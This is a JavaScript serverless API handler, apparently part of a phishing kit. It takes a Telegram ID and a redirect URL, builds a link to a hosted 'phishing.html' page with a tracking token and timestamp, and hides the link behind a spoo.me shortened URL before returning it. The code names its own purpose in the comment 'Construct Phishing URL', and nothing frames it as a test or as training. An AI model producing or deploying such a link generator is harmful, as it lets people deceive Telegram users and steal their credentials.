export default async (req, res) => {
  // 1. Method Check
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed', allowedMethods: ['POST'] });
  }

  // 2. Input Validation
  if (!req.body || !req.body.telegramId || !req.body.redirectUrl) {
    return res.status(400).json({ error: 'Missing required fields: telegramId, redirectUrl' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // 3. Security Check (basic URL validation)
    try {
      new URL(redirectUrl); // Throws if invalid URL
    } catch (e) {
      return res.status(400).json({ error: 'Invalid redirectUrl format' });
    }

    // 4. Token Generation (32-char alphanumeric)
    const token = [...Array(32)]
      .map(() => Math.random().toString(36)[2])
      .join('')
      .toUpperCase();

    // 5. Construct Phishing URL
    const phishingParams = new URLSearchParams({
      telegramId,
      redirectUrl: encodeURIComponent(redirectUrl),
      token,
      t: Date.now() // timestamp for tracking
    });

    const longUrl = `https://opaslabs.vercel.app/phishing.html?${phishingParams.toString()}`;

    // 6. URL Shortening with Spoo.me
    let shortUrl = longUrl; // Default fallback
    
    try {
      const spooResponse = await fetch('https://spoo.me/api/v1/shorten', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: longUrl }),
        timeout: 3000 // 3s timeout
      });

      if (spooResponse.ok) {
        const { short_url } = await spooResponse.json();
        shortUrl = short_url || longUrl;
      }
    } catch (e) {
      console.warn('URL shortening failed, using long URL:', e.message);
    }

    // 7. Response
    return res.status(200).json({
      success: true,
      originalUrl: longUrl,
      shortUrl,
      token,
      expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    });

  } catch (error) {
    console.error('Server Error:', error);
    return res.status(500).json({ 
      error: 'Internal server error',
      details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
};
